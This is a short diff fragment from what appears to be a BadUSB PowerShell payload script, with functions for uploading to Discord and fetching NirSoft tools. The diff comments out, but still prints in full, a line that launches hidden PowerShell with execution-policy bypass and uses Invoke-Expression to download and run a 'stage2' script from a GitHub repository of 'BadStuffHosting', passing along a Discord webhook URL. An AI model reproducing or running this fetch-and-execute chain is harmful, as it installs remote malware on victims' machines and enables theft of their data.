@@ -42,8 +42,10 @@ function Upload-Discord {
 
 TempDir
 Get-Nirsoft
+<#
 Start-Sleep -Seconds 15
 # Invoquer stage2 avec la variable $DiscordUrl
 Invoke-Expression @"
 iex "powershell.exe -w h -NoP -Ep Bypass -Command `$DiscordUrl = '$DiscordUrl'; $(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage2_t3st.ps1')"
 "@
+#>
